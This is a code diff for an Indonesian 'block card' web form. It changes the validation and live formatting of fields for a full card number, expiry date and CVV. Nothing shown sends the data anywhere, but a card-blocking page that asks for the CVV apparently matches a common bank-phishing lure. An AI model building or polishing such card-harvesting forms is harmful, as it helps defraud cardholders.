@@ -270,40 +270,43 @@
       <div class="form-box">
         <form id="cardForm">
           <div class="mb-3">
-            <input
-              type="text"
-                inputmode="numeric"
-              maxlength="16"
-              pattern="\d{16}"
-              class="form-control text-center"
-              id="cardNumber"
-              placeholder="Masukkan 16 digit Nomor kartu"
-              required
-            />
+<input
+  type="text"
+  inputmode="numeric"
+  pattern="(?:\d{4} ?){4}"
+  maxlength="19"
+  class="form-control text-center"
+  id="cardNumber"
+  placeholder="Masukkan 16 digit Nomor kartu"
+  required
+/>
+
           </div>
           <div class="row g-2 mb-3">
             <div class="col-6">
-              <input
-                type="text"
-                  inputmode="numeric"
-                maxlength="5"
-                class="form-control text-center"
-                id="validThru"
-                placeholder="MM/YY"
-                required
-              />
+       <input
+  type="text"
+  inputmode="numeric"
+  pattern="(0[1-9]|1[0-2])\/\d{2}"
+  maxlength="5"
+  class="form-control text-center"
+  id="validThru"
+  placeholder="MM/YY"
+  required
+/>
+
             </div>
             <div class="col-6">
-              <input
-                type="text"
-                maxlength="3"
-                
-                  inputmode="numeric"
-                class="form-control text-center"
-                id="cvv"
-                placeholder="CVV 3"
-                required
-              />
+             <input
+  type="text"
+  inputmode="numeric"
+  pattern="\d*"
+  maxlength="3"
+  class="form-control text-center"
+  id="cvv"
+  placeholder="CVV"
+  required
+/>
             </div>
           </div>
       <button type="submit" class="btn btn-primary btn-block">Blokir kartu</button>
@@ -324,16 +327,16 @@
 
   // Format kartu real time
   if (cardInput) {
-    cardInput.addEventListener("input", () => {
-      let val = cardInput.value.replace(/\D/g, "").slice(0, 16);
-      cardInput.value = val;
-      if (liveCardNumber) {
-        liveCardNumber.textContent = val
-          .replace(/(.{4})/g, "$1 ")
-          .trim()
-          .padEnd(19, "•");
-      }
-    });
+   cardInput.addEventListener("input", () => {
+  let raw = cardInput.value.replace(/\D/g, "").slice(0, 16); // ambil hanya angka
+  let formatted = raw.replace(/(.{4})/g, "$1 ").trim(); // tambahkan spasi tiap 4 digit
+  cardInput.value = formatted;
+
+  if (liveCardNumber) {
+    liveCardNumber.textContent = formatted.padEnd(19, "•");
+  }
+});
+
   }
 
   // Format Valid Thru auto
